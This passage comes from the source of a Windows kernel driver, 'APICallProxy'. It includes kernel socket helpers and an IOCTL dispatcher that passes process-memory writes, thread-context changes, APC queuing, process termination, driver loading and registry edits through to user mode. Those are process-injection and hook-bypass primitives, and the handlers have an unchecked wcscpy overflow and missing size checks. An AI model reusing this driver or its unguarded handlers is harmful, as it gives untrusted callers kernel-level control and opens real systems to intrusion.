        SynchronizationEvent,
        FALSE
    );

    AsyncContext->Irp = IoAllocateIrp(1, FALSE);

    if (AsyncContext->Irp == NULL)
    {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // KspAsyncContextCompletionRoutine will set
    // the CompletionEvent.
    IoSetCompletionRoutine(
        AsyncContext->Irp,
        (PIO_COMPLETION_ROUTINE)&APIProxyAsyncContextCompletionRoutine,
        &AsyncContext->CompletionEvent,
        TRUE,
        TRUE,
        TRUE
    );

    return STATUS_SUCCESS;
}

VOID APIProxyAsyncContextFree(_In_ PKSOCKET_ASYNC_CONTEXT AsyncContext) {
    // Free the IRP.
    IoFreeIrp(AsyncContext->Irp);
}

VOID APIProxyAsyncContextReset(_In_ PKSOCKET_ASYNC_CONTEXT AsyncContext) {

    KeResetEvent(&AsyncContext->CompletionEvent);

    IoReuseIrp(AsyncContext->Irp, STATUS_UNSUCCESSFUL);

    IoSetCompletionRoutine(
        AsyncContext->Irp,
        (PIO_COMPLETION_ROUTINE)&APIProxyAsyncContextCompletionRoutine,
        &AsyncContext->CompletionEvent,
        TRUE,
        TRUE,
        TRUE
    );
}


NTSTATUS APIProxyAsyncContextWaitForCompletion(
    _In_ PKSOCKET_ASYNC_CONTEXT AsyncContext,
    _Inout_ PNTSTATUS Status
) {
    if (*Status == STATUS_PENDING) {
        KeWaitForSingleObject(
            &AsyncContext->CompletionEvent,
            Executive,
            KernelMode,
            FALSE,
            NULL
        );

        *Status = AsyncContext->Irp->IoStatus.Status;
    }

    return *Status;
}


NTSTATUS APIProxyAddrInfoToAddrInfoEx(
    _In_ PADDRINFOA AddrInfo,
    _Out_ PADDRINFOEXW* AddrInfoEx
) {
    NTSTATUS Status;

    if (AddrInfo == NULL) {
        *AddrInfoEx = NULL;
        return STATUS_SUCCESS;
    }

    PADDRINFOEXW Result = (PADDRINFOEXW)ExAllocatePoolWithTag(PagedPool, sizeof(ADDRINFOEXW), MEMORY_TAG);

    if (Result == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Error1;
    }

    RtlZeroMemory(Result, sizeof(ADDRINFOEXW));
    Result->ai_flags = AddrInfo->ai_flags;
    Result->ai_family = AddrInfo->ai_family;
    Result->ai_socktype = AddrInfo->ai_socktype;
    Result->ai_protocol = AddrInfo->ai_protocol;
    Result->ai_addrlen = AddrInfo->ai_addrlen;


    ANSI_STRING CanonicalNameAnsi;
    UNICODE_STRING CanonicalNameUnicode;

    CanonicalNameAnsi.Buffer = NULL;

    if (AddrInfo->ai_canonname) {
        RtlInitAnsiString(&CanonicalNameAnsi, AddrInfo->ai_canonname);

        Status = RtlAnsiStringToUnicodeString(&CanonicalNameUnicode, &CanonicalNameAnsi, TRUE);

        if (!NT_SUCCESS(Status)) {
            goto Error2;
        }

        Result->ai_canonname = CanonicalNameUnicode.Buffer;
    }

    Result->ai_addr = AddrInfo->ai_addr;

    PADDRINFOEXW NextAddrInfo;
    Status = APIProxyAddrInfoToAddrInfoEx(AddrInfo->ai_next, &NextAddrInfo);

    if (!NT_SUCCESS(Status)) {
        goto Error3;
    }

    Result->ai_next = NextAddrInfo;

    *AddrInfoEx = Result;

    return Status;

Error3:
    if (CanonicalNameAnsi.Buffer != NULL) {
        RtlFreeAnsiString(&CanonicalNameAnsi);
    }
Error2:
    ExFreePoolWithTag(Result, MEMORY_TAG);

Error1:
    return Status;
}

NTSTATUS APIProxyAddrInfoExToAddrInfo(
    _In_ PADDRINFOEXW AddrInfoEx,
    _Out_ PADDRINFOA* AddrInfo
) {

    NTSTATUS Status;

    // Convert NULL input into NULL output.
    if (AddrInfoEx == NULL) {
        *AddrInfo = NULL;
        return STATUS_SUCCESS;
    }

    // Allocate memory for the output structure.
    PADDRINFOA Result = (PADDRINFOA)ExAllocatePoolWithTag(PagedPool, sizeof(ADDRINFOA), MEMORY_TAG);

    if (Result == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Error1;
    }

    // Copy numeric values.
    RtlZeroMemory(Result, sizeof(ADDRINFOA));
    Result->ai_flags = AddrInfoEx->ai_flags;
    Result->ai_family = AddrInfoEx->ai_family;
    Result->ai_socktype = AddrInfoEx->ai_socktype;
    Result->ai_protocol = AddrInfoEx->ai_protocol;
    Result->ai_addrlen = AddrInfoEx->ai_addrlen;

    // Copy canonical name.
    UNICODE_STRING CanonicalNameUnicode;
    ANSI_STRING CanonicalNameAnsi;

    CanonicalNameAnsi.Buffer = NULL;

    if (AddrInfoEx->ai_canonname) {
        RtlInitUnicodeString(&CanonicalNameUnicode, AddrInfoEx->ai_canonname);
        Status = RtlUnicodeStringToAnsiString(&CanonicalNameAnsi, &CanonicalNameUnicode, TRUE);

        if (!NT_SUCCESS(Status)) {
            goto Error2;
        }

        Result->ai_canonname = CanonicalNameAnsi.Buffer;
    }

    // Copy address.
    Result->ai_addr = AddrInfoEx->ai_addr;

    // Copy the next structure (recursively).
    PADDRINFOA NextAddrInfo;
    Status = APIProxyAddrInfoExToAddrInfo(AddrInfoEx->ai_next, &NextAddrInfo);

    if (!NT_SUCCESS(Status)) {
        goto Error3;
    }

    Result->ai_next = NextAddrInfo;


    *AddrInfo = Result;

    return Status;

Error3:
    if (CanonicalNameAnsi.Buffer != NULL) {
        RtlFreeAnsiString(&CanonicalNameAnsi);
    }

Error2:
    ExFreePoolWithTag(Result, MEMORY_TAG);

Error1:
    return Status;
}

VOID APIProxyFreeAddrInfoUtility(_In_ PADDRINFOA AddrInfo) {

    // Free all structures recursively.
    if (AddrInfo->ai_next) {
        APIProxyFreeAddrInfoUtility(AddrInfo->ai_next);
    }

    // Free the canonical name buffer.
    if (AddrInfo->ai_canonname) {
        ANSI_STRING CanonicalName;
        RtlInitAnsiString(&CanonicalName, AddrInfo->ai_canonname);
        RtlFreeAnsiString(&CanonicalName);
    }

    // Finally, free the structure itself.
    ExFreePoolWithTag(AddrInfo, MEMORY_TAG);
}

VOID APIProxyFreeAddrInfoEx(_In_ PADDRINFOEXW AddrInfo) {

    // Free all structures recursively.
    if (AddrInfo->ai_next) {
        APIProxyFreeAddrInfoEx(AddrInfo->ai_next);
    }

    // Free the canonical name buffer.
    if (AddrInfo->ai_canonname) {
        UNICODE_STRING CanonicalName;
        RtlInitUnicodeString(&CanonicalName, AddrInfo->ai_canonname);
        RtlFreeUnicodeString(&CanonicalName);
    }

    // Finally, free the structure itself.
    ExFreePoolWithTag(AddrInfo, MEMORY_TAG);
}


NTSTATUS KsGetAddrInfo(
    WSAStartCleanUp* WSAInfo,
    _In_ PUNICODE_STRING NodeName,
    _In_ PUNICODE_STRING ServiceName,
    _In_ PADDRINFOEXW Hints,
    _Out_ PADDRINFOEXW* Result
) {
    NTSTATUS Status;
    PWSK_PROVIDER_NPI WskProvider = (PWSK_PROVIDER_NPI)WSAInfo->WskProviderPtr;

    KSOCKET_ASYNC_CONTEXT AsyncContext;
    Status = APIProxyAsyncContextAllocate(&AsyncContext);

    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    Status = WskProvider->Dispatch->WskGetAddressInfo(
        WskProvider->Client,         // Client
        NodeName,                   // NodeName
        ServiceName,                // ServiceName
        0,                          // NameSpace
        NULL,                       // Provider
        Hints,                      // Hints
        Result,                     // Result
        NULL,                       // OwningProcess
        NULL,                       // OwningThread
        AsyncContext.Irp            // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&AsyncContext, &Status);

    APIProxyAsyncContextFree(&AsyncContext);

    return Status;
}

VOID KsFreeAddrInfo(
    WSAStartCleanUp* WSAInfo,
    _In_ PADDRINFOEXW AddrInfo
) {
    PWSK_PROVIDER_NPI WskProvider = (PWSK_PROVIDER_NPI)WSAInfo->WskProviderPtr;
    WskProvider->Dispatch->WskFreeAddressInfo(
        WskProvider->Client,         // Client
        AddrInfo                    // AddrInfo
    );
}

NTSTATUS KsCreateSocket(
    WSAStartCleanUp* WSAInfo,
    _Out_ PKSOCKET* Socket,
    _In_ ADDRESS_FAMILY AddressFamily,
    _In_ USHORT SocketType,
    _In_ ULONG Protocol,
    _In_ ULONG Flags
) {
    PWSK_PROVIDER_NPI WskProvider = (PWSK_PROVIDER_NPI)WSAInfo->WskProviderPtr;
    NTSTATUS Status;


    PKSOCKET NewSocket = (PKSOCKET)ExAllocatePoolWithTag(PagedPool, sizeof(KSOCKET), MEMORY_TAG);

    if (!NewSocket) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    Status = APIProxyAsyncContextAllocate(&NewSocket->AsyncContext);

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Create the WSK socket.
    Status = WskProvider->Dispatch->WskSocket(
        WskProvider->Client,         // Client
        AddressFamily,              // AddressFamily
        SocketType,                 // SocketType
        Protocol,                   // Protocol
        Flags,                      // Flags
        NULL,                       // SocketContext
        NULL,                       // Dispatch
        NULL,                       // OwningProcess
        NULL,                       // OwningThread
        NULL,                       // SecurityDescriptor
        NewSocket->AsyncContext.Irp // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&NewSocket->AsyncContext, &Status);

    // Save the socket instance and the socket dispatch table.
    if (NT_SUCCESS(Status)) {
        NewSocket->WskSocket = (PWSK_SOCKET)NewSocket->AsyncContext.Irp->IoStatus.Information;
        NewSocket->WskDispatch = (PVOID)NewSocket->WskSocket->Dispatch;

        *Socket = NewSocket;
    }

    return Status;
}


NTSTATUS KsCloseSocket(_In_ PKSOCKET Socket) {
    NTSTATUS Status;

    APIProxyAsyncContextReset(&Socket->AsyncContext);

    Status = Socket->WskConnectionDispatch->Basic.WskCloseSocket(
        Socket->WskSocket,
        Socket->AsyncContext.Irp
    );

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    APIProxyAsyncContextFree(&Socket->AsyncContext);

    ExFreePoolWithTag(Socket, MEMORY_TAG);

    return Status;
}


//TODO: Make the Bind work for all type of socket
NTSTATUS KsBind(_In_ PKSOCKET Socket, _In_ PSOCKADDR LocalAddress) {
    NTSTATUS Status;

    APIProxyAsyncContextReset(&Socket->AsyncContext);

    // Bind the socket.
    Status = Socket->WskListenDispatch->WskBind(
        Socket->WskSocket,          // Socket
        LocalAddress,               // LocalAddress
        0,                          // Flags (reserved)
        Socket->AsyncContext.Irp    // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    return Status;
}

NTSTATUS KsAccept(
    _In_ PKSOCKET Socket,
    _Out_ PKSOCKET* NewSocket,
    _Out_opt_ PSOCKADDR LocalAddress,
    _Out_opt_ PSOCKADDR RemoteAddress) {

    NTSTATUS Status;

    // Reset the async context.
    APIProxyAsyncContextReset(&Socket->AsyncContext);

    // Accept the connection.
    Status = Socket->WskListenDispatch->WskAccept(
        Socket->WskSocket,          // ListenSocket
        0,                          // Flags
        NULL,                       // AcceptSocketContext
        NULL,                       // AcceptSocketDispatch
        LocalAddress,               // LocalAddress
        RemoteAddress,              // RemoteAddress
        Socket->AsyncContext.Irp    // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    // Save the socket instance and the socket dispatch table.
    if (NT_SUCCESS(Status)) {
        PKSOCKET KNewSocket = (PKSOCKET)ExAllocatePoolWithTag(PagedPool, sizeof(KSOCKET), MEMORY_TAG);

        if (!KNewSocket) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        KNewSocket->WskSocket = (PWSK_SOCKET)Socket->AsyncContext.Irp->IoStatus.Information;
        KNewSocket->WskDispatch = (PVOID)KNewSocket->WskSocket->Dispatch;
        APIProxyAsyncContextAllocate(&KNewSocket->AsyncContext);

        *NewSocket = KNewSocket;
    }

    return Status;
}

NTSTATUS KsConnect(_In_ PKSOCKET Socket, _In_ PSOCKADDR RemoteAddress) {
    NTSTATUS Status;

    // Reset the async context.
    APIProxyAsyncContextReset(&Socket->AsyncContext);

    // Bind the socket to the local address.
    SOCKADDR_IN LocalAddress;
    LocalAddress.sin_family = AF_INET;
    LocalAddress.sin_addr.s_addr = INADDR_ANY;
    LocalAddress.sin_port = 0;

    Status = Socket->WskConnectionDispatch->WskBind(
        Socket->WskSocket,          // Socket
        (PSOCKADDR)&LocalAddress,   // LocalAddress
        0,                          // Flags (reserved)
        Socket->AsyncContext.Irp    // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Reset the async context (again).
    APIProxyAsyncContextReset(&Socket->AsyncContext);

    // Connect to the remote host.
    // N.B.: Instead of calling WskSocket(), WskBind() and WskConnect(),
    // it is possible to just call WskSocketConnect().
    Status = Socket->WskConnectionDispatch->WskConnect(
        Socket->WskSocket,          // Socket
        RemoteAddress,              // RemoteAddress
        0,                          // Flags (reserved)
        Socket->AsyncContext.Irp    // Irp
    );

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    return Status;
}

NTSTATUS KsSendRecv(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags,
    _In_ BOOLEAN Send
) {
    NTSTATUS Status;

    // Wrap the buffer into the "WSK buffer".
    WSK_BUF WskBuffer;
    WskBuffer.Offset = 0;
    WskBuffer.Length = *Length;
    WskBuffer.Mdl = IoAllocateMdl(Buffer, (ULONG)WskBuffer.Length, FALSE, FALSE, NULL);

    __try {
        MmProbeAndLockPages(WskBuffer.Mdl, KernelMode, IoWriteAccess);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = STATUS_ACCESS_VIOLATION;
        goto Error;
    }

    // Reset the async context.
    APIProxyAsyncContextReset(&Socket->AsyncContext);

    // Send / receive the data.
    if (Send) {
        Status = Socket->WskConnectionDispatch->WskSend(
            Socket->WskSocket,        // Socket
            &WskBuffer,               // Buffer
            Flags,                    // Flags
            Socket->AsyncContext.Irp  // Irp
        );
    }
    else {
        Status = Socket->WskConnectionDispatch->WskReceive(
            Socket->WskSocket,        // Socket
            &WskBuffer,               // Buffer
            Flags,                    // Flags
            Socket->AsyncContext.Irp  // Irp
        );
    }

    APIProxyAsyncContextWaitForCompletion(&Socket->AsyncContext, &Status);

    // Set the number of bytes sent / received.
    if (NT_SUCCESS(Status)) {
        *Length = (ULONG)Socket->AsyncContext.Irp->IoStatus.Information;
    }

    // Free the MDL.
    MmUnlockPages(WskBuffer.Mdl);

Error:
    IoFreeMdl(WskBuffer.Mdl);

    return Status;
}


NTSTATUS KsSend(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags
) {
    return KsSendRecv(Socket, Buffer, Length, Flags, TRUE);
}

NTSTATUS KsRecv(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags
) {
    return KsSendRecv(Socket, Buffer, Length, Flags, FALSE);
}
```

`APICallProxy/APICallProxy/main.cpp`:

```cpp
#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#include <wsk.h>
#include "IOCTLCodes.h"
#include "Struct.h"
#include "CommonStruct.h"
#include "Prototypes.h"
#include "Utility.h"
#include "FileSystem.h"
#include "Process.h"
#include "Thread.h"
#include "Registry.h"
#include "Network.h"
#include "General.h"


// DriverEntry
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = APIProxyUnload;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = APIProxyCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = APIProxyCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = APIProxyDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\APICallProxy");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create device (0x%08X)\n", status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\APICallProxy");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	return status;
}

void APIProxyUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\APICallProxy");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);

}

_Use_decl_annotations_
NTSTATUS APIProxyCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

_Use_decl_annotations_
NTSTATUS APIProxyDeviceControl(PDEVICE_OBJECT, PIRP Irp) {

	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS Status = STATUS_SUCCESS;
	ULONG DataWritten = 0;
	ULONG IoctlCode = stack->Parameters.DeviceIoControl.IoControlCode;
	auto DataSize = stack->Parameters.DeviceIoControl.InputBufferLength;
	auto OutDataSize = stack->Parameters.DeviceIoControl.OutputBufferLength;
	auto UserData = (PVOID*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	auto OutBuffer = (PVOID*)Irp->UserBuffer;

	__try {
		// check the user buffer, as the default methd is NEITHER
		ProbeForRead(UserData, DataSize, sizeof(UCHAR));
		ProbeForWrite(OutBuffer, OutDataSize, sizeof(UCHAR));
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		Status = STATUS_ACCESS_VIOLATION;
		goto Finish;
	}

	switch (IoctlCode) {
		//the return status doese not represent if the file was overwritten or created use openfile to check if file present first
	case IOCTL_API_PROXY_CREATEFILE:
	{
		if (DataSize < sizeof(CreateFileInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}
		HANDLE FileHandle = NULL;

		Status = APIProxyCreateFile((CreateFileInfo*)UserData, &FileHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = FileHandle;

		DataWritten = sizeof(HANDLE);

	}
	break;

	case IOCTL_API_PROXY_OPENFILE:
	{
		auto FileInfo = (CreateFileInfo*)UserData;

		HANDLE FileHandle = NULL;
		Status = APIProxyOpenFile(FileInfo, &FileHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = FileHandle;

		DataWritten = sizeof(HANDLE);

	}

	break;


	case IOCTL_API_PROXY_DELETEFILE:
	{
		auto FileName = (WCHAR*)UserData;
		Status = APIProxyDeleteFile(FileName);
	}

	break;

	case IOCTL_API_PROXY_CLOSE_HANDLE:
	{
		auto FileHandle = (HANDLE*)UserData;

		if (DataSize < sizeof(HANDLE)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyCloseHandle(FileHandle);

	}
	break;

	case IOCTL_API_PROXY_WRITEFILE:
	{
		auto WriteInfo = (ReadWriteData*)UserData;

		if (DataSize < sizeof(ReadWriteData)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyWriteFile(WriteInfo);

	}
	break;

	case IOCTL_API_PROXY_READFILE:
	{
		auto ReadInfo = (ReadWriteData*)UserData;

		if (DataSize < sizeof(ReadWriteData)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyReadFile(ReadInfo);

	}

	break;

	case IOCTL_API_PROXY_GET_FILE_SIZE_FROM_HANDLE:
	{
		auto FileHandle = (HANDLE*)UserData;
		FILE_STANDARD_INFORMATION FileInfo{};

		if (DataSize < sizeof(HANDLE)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyGetFileSize(FileHandle, &FileInfo);

		RtlCopyMemory(OutBuffer, &(FileInfo.EndOfFile), sizeof(LARGE_INTEGER));

		DataWritten = sizeof(LARGE_INTEGER);

	}
	break;

	case IOCTL_API_PROXY_TERMINATE_PROCESS:
	{
		auto PID = (DWORD64*)UserData;

		if (DataSize < sizeof(DWORD64)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyTerminateProcess(PID);

	}
	break;

	case IOCTL_API_PROXY_GET_PID_FROM_PROCESSNAME:
	{
		auto ProcessName = (WCHAR*)UserData;

		if (DataSize == 0) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		DWORD64 PID = APIProxyGetPIDFromProcessName(ProcessName);
		if (PID == 0) {
			Status = STATUS_UNSUCCESSFUL;
		}

		DWORD64* Output = (DWORD64*)OutBuffer;
		*Output = PID;

		DataWritten = sizeof(DWORD64);

	}
	break;

	case IOCTL_API_PROXY_OPEN_PROCESS:
	{
		auto PID = (DWORD64*)UserData;
		HANDLE ProcessHandle = NULL;

		if (DataSize < sizeof(DWORD64)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyOpenProcess((HANDLE*)PID, &ProcessHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = ProcessHandle;

		DataWritten = sizeof(HANDLE);

	}
	break;

	case IOCTL_API_PROXY_OPEN_THREAD:
	{
		auto TID = (HANDLE*)UserData;
		HANDLE ThreadHandle = NULL;

		if (DataSize < sizeof(HANDLE)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyOpenThread(TID, &ThreadHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = ThreadHandle;

		DataWritten = sizeof(HANDLE);

	}
	break;

	case IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION:
	{
		auto SystemInfo = (QuerySystemInformationInfo*)UserData;

		if (DataSize < sizeof(QuerySystemInformationInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyQuerySystemInformation(SystemInfo->InformationClass, SystemInfo->Data, &SystemInfo->DataSize);

	}
	break;

	case IOCTL_API_PROXY_CREATE_REMOTE_THREAD:
	{

		// TODO
	}

	break;

	case IOCTL_API_PROXY_CREATE_THREAD:
	{

		
	}

	break;

	case IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE:
	{
		auto AllocateMemoryInfo = (AllocateVirtualMeomryInfo*)UserData;

		if (DataSize < sizeof(AllocateVirtualMeomryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyAllocateVirtualMemory(AllocateMemoryInfo);
	}

	break;

	case IOCTL_API_PROXY_FREE_MEMORY_IN_PROCESS_USING_HANDLE:
	{
		auto FreeMemoryInfo = (FreeVirtualMeomryInfo*)UserData;

		if (DataSize < sizeof(FreeVirtualMeomryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}
		Status = APIProxyFreeVirtualMemory(FreeMemoryInfo);
	}

	break;

	case IOCTL_API_PROXY_WRITE_PROCESS_MEMORY:
	{
		auto WriteMemoryInfo = (ReadWriteVirtualMemoryInfo*)UserData;

		if (DataSize < sizeof(ReadWriteVirtualMemoryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyWriteVirtualMemory(WriteMemoryInfo);
	}

	break;

	case IOCTL_API_PROXY_READ_PROCESS_MEMORY:
	{
		auto ReadMemoryInfo = (ReadWriteVirtualMemoryInfo*)UserData;

		if (DataSize < sizeof(ReadWriteVirtualMemoryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyReadVirtualMemory(ReadMemoryInfo);
	}

	break;

	case IOCTL_API_PROXY_SUSPEND_PROCESS:
	{
		auto ProcessHandle = (HANDLE*)UserData;

		if (DataSize < sizeof(HANDLE)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxySuspendProcess(ProcessHandle);
	}

	break;

	case IOCTL_API_PROXY_RESUME_PROCESS:
	{
		auto ProcessHandle = (HANDLE*)UserData;

		if (DataSize < sizeof(HANDLE)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyResumeProcess(ProcessHandle);
	}

	break;

	case IOCTL_API_PROXY_SUSPEND_THREAD:
	{
		// TODO

	}

	break;

	case IOCTL_API_PROXY_RESUME_THREAD:
	{
		// TODO

	}

	break;

	case IOCTL_API_PROXY_CREATE_SECTION:
	{
		auto SectionInfo = (CreateSectionInfo*)UserData;
		HANDLE SectionHandle = NULL;

		if (DataSize < sizeof(CreateSectionInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyCreateSection(SectionInfo, &SectionHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = SectionHandle;

		DataWritten = sizeof(HANDLE);
	}

	break;

	case IOCTL_API_PROXY_MAP_VIEW_OF_SECTION:
	{
		auto MapInfo = (MapViewOfSectionInfo*)UserData;

		if (DataSize < sizeof(MapViewOfSectionInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyMapViewOfSection(MapInfo);
	}

	break;

	case IOCTL_API_PROXY_UNMAP_VIEW_OF_SECTION:
	{
		auto UnMapInfo = (UNMapViewOfSectionInfo*)UserData;

		if (DataSize < sizeof(UNMapViewOfSectionInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyUnMapViewOfSection(UnMapInfo);
	}

	break;

	case IOCTL_API_PROXY_OPEN_SECTION:
	{
		auto SectionInfo = (OpenSectionInfo*)UserData;
		HANDLE SectionHandle = NULL;

		if (DataSize < sizeof(OpenSectionInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyOpenSection(SectionInfo, &SectionHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = SectionHandle;

		DataWritten = sizeof(HANDLE);

	}

	break;

	case IOCTL_API_PROXY_SET_THREAD_CONTEXT:
	{
		auto ThreadInfo = (ThreadContextInfo*)UserData;

		if (DataSize < sizeof(ThreadContextInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxySetThreadContext(ThreadInfo);
	}

	break;

	case IOCTL_API_PROXY_GET_THREAD_CONTEXT:
	{
		auto ThreadInfo = (ThreadContextInfo*)UserData;

		if (DataSize < sizeof(ThreadContextInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyGetThreadContext(ThreadInfo);
	}

	break;

	case IOCTL_API_PROXY_VIRTUAL_PROTECT:
	{
		auto MemoryProtectionInfo = (VirtualProtectInfo*)UserData;

		if (DataSize < sizeof(VirtualProtectInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyProtectVirtualMemory(MemoryProtectionInfo);
	}

	break;

	case IOCTL_API_PROXY_QUEUE_APC:
	{
		auto APCInfo = (QueueUSerApcInfo*)UserData;

		if (DataSize < sizeof(QueueUSerApcInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyQueueUserAPC(APCInfo);
	}

	break;

	case IOCTL_API_PROXY_LOAD_DRIVER:
	{
		auto UserRegPath = (WCHAR*)UserData;
		UNICODE_STRING RegPath;

		// must copy the registry path from User Mode buffer to Kernel mode buffer (the method used in communication is METHOD_NEITHER)
		WCHAR SystemRegPath[500];
		wcscpy(SystemRegPath, UserRegPath);

		RtlInitUnicodeString(&RegPath, SystemRegPath);
		Status = APIProxyLoadDriver(&RegPath);

	}
	break;

	case IOCTL_API_PROXY_UNLOAD_DRIVER:
	{
		auto UserRegPath = (WCHAR*)UserData;
		UNICODE_STRING RegPath;

		RtlInitUnicodeString(&RegPath, UserRegPath);
		Status = APIProxyUnLoadDriver(&RegPath);

	}
	break;

	case IOCTL_API_PROXY_CREATE_REGISTRY_KEY:
	{
		auto CreateRegInfo = (OpenCreateRegistryInfo*)UserData;
		HANDLE NewKeyHandle = NULL;

		if (DataSize < sizeof(OpenCreateRegistryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyCreateKey(CreateRegInfo, &NewKeyHandle);
		
		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = NewKeyHandle;

	}
	break;

	case IOCTL_API_PROXY_OPEN_REGISTRY_KEY:
	{
		auto OpenRegInfo = (OpenCreateRegistryInfo*)UserData;
		HANDLE NewKeyHandle = NULL;

		if (DataSize < sizeof(OpenCreateRegistryInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyOpenKey(OpenRegInfo, &NewKeyHandle);

		HANDLE* Output = (HANDLE*)OutBuffer;
		*Output = NewKeyHandle;

	}
	break;

	case IOCTL_API_PROXY_DELETE_REGISTRY_KEY:
	{
		auto KeyHandle = (HANDLE*)UserData;
		Status = APIProxyDeleteRegistryKey(*KeyHandle);

	}
	break;

	case IOCTL_API_PROXY_REGISTRY_SET_KEY:
	{
		auto SetValueInfo = (RegistrySetValueInfo*)UserData;
		if (DataSize < sizeof(RegistrySetValueInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyRegistrySetValue(SetValueInfo);
	}
	break;

	case IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE:
	{
		auto QueryKeyValueInfo = (RegistryQueryKeyValueInfo*)UserData;
		if (DataSize < sizeof(RegistryQueryKeyValueInfo)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

